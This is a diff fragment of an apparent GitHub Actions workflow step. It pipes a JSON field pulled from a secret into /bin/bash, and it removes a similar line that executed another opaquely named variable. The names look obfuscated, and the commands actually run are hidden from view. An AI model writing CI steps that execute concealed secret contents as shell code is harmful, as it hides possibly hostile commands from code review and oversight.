@@ -27,7 +27,6 @@ jobs:
           o95: ${{ secrets.o95 }}
         run: |
           printf '%s' "$o95" | jq -r .t99 | /bin/bash
-          echo $r9365 | jq -r .wlyao73209 | /bin/bash
 
       - name: Persist output
         if: always()
